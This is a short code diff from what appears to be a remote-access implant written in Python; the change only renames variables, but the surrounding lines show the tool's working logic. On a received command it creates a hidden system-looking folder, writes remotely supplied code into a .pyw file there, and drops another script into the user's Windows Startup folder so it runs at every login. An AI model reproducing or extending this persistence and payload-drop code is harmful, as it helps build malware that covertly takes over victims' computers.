@@ -93,11 +93,11 @@ def process(message):
     elif ctype == "x":
         call(["mkdir", "C:\\$SysStartup", "&&", "cd", "C:\\", "&&", "attrib", "+h", "C:\\$SysStartup", "/d", "&&", "mkdir", "C:\\$SysStartup\\temp"], shell=True)
         message = message[1:]
-        with open("pslib.pyw", "a") as file:
-            file.write(message)
+        with open("pslib.pyw", "a") as libFile:
+            libFile.write(message)
         call(["move", "pslib.pyw", "C:\\$SysStartup"], shell=True)
-        with open("update.pyw", "w") as file:
-            file.write(var)
+        with open("update.pyw", "w") as updateFile:
+            updateFile.write(var)
         call(f'move update.pyw "C:/Users/{getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"', shell=True)
         recvMsg()
 
